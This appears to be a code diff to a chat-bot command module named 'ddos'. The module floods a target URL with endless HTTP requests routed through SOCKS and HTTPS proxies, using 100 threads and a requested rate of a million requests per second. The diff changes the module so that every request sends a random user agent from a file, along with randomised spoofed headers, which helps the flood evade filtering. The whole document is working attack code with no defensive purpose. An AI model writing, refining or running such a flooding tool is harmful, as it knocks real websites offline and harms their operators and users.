@@ -3,9 +3,6 @@ const fs = require("fs");
 const path = require("path");
 const SocksProxyAgent = require("socks-proxy-agent");
 const HttpsProxyAgent = require("https-proxy-agent");
-const {
-    generateUserAgent
-} = require("../system/useragent.js");
 
 module.exports["config"] = {
     name: "ddos",
@@ -67,14 +64,25 @@ const acceptHeaders = [
 ];
 
 const proxyFilePath = path.join(__dirname, "proxy.txt");
+const ualist = path.join(__dirname, "ua.txt");
 const maxRequests = Number.MAX_SAFE_INTEGER;
 const requestsPerSecond = 1000000;
 const numThreads = 100;
 
 const getRandomElement = (arr) => arr[Math.floor(Math.random() * arr.length)];
 
-function sanitizeUA(userAgent) {
+const sanitizeUA = (userAgent) => {
     return userAgent.replace(/[^\x20-\x7E]/g, "");
+}
+
+const userAgents = () => {
+    try {
+        const data = fs.readFileSync(ualist, "utf-8").replace(/\r/g, "").split("\n");
+        return data.map((line) => line.trim());
+    } catch (error) {
+        console.error(`Failed to read user agent list: ${error}`);
+        return [];
+    }
 }
 
 const loadProxies = () => {
@@ -88,9 +96,21 @@ const loadProxies = () => {
 const performAttack = (url, agent, headers, continueAttack, onComplete) => {
     if (!continueAttack) return;
 
+    const headersForRequest = {
+        "User-Agent": sanitizeUA(getRandomElement(userAgents())),
+        "Accept": getRandomElement(acceptHeaders),
+        "Accept-Language": getRandomElement(langHeaders),
+        "Cache-Control": getRandomElement(cipherSuites),
+        "Referer": getRandomElement(referrers),
+        "Connection": "keep-alive",
+        "DNT": "1",
+        "Upgrade-Insecure-Requests": "1",
+        "TE": "Trailers",
+    };
+
     axios.get(url, {
         httpAgent: agent || null,
-        headers,
+        headers: headersForRequest,
         timeout: 0
     })
     .then(() => setTimeout(() => performAttack(url, agent, headers, continueAttack, onComplete), 0))
@@ -122,18 +142,6 @@ module.exports["run"] = async ({
         return chat.reply(font.thin("No proxies found. Please add proxies to the proxy file."));
     }
 
-    const headers = {
-        "User-Agent": sanitizeUA(generateUserAgent()),
-        "Accept": getRandomElement(acceptHeaders),
-        "Accept-Language": getRandomElement(langHeaders),
-        "Cache-Control": getRandomElement(cipherSuites),
-        "Referer": getRandomElement(referrers),
-        "Connection": "keep-alive",
-        "DNT": "1",
-        "Upgrade-Insecure-Requests": "1",
-        "TE": "Trailers",
-    };
-
     let continueAttack = true;
     await chat.reply(font.thin("Starting DDOS ATTACK..."));
 
@@ -153,7 +161,7 @@ module.exports["run"] = async ({
             ? new SocksProxyAgent(proxyUrl)
             : new HttpsProxyAgent(proxyUrl);
 
-        performAttack(targetUrl, agent, headers, continueAttack, () => {
+        performAttack(targetUrl, agent, null, continueAttack, () => {
             if (!continueAttack) {
                 clearTimeout(attackTimeout);
             }
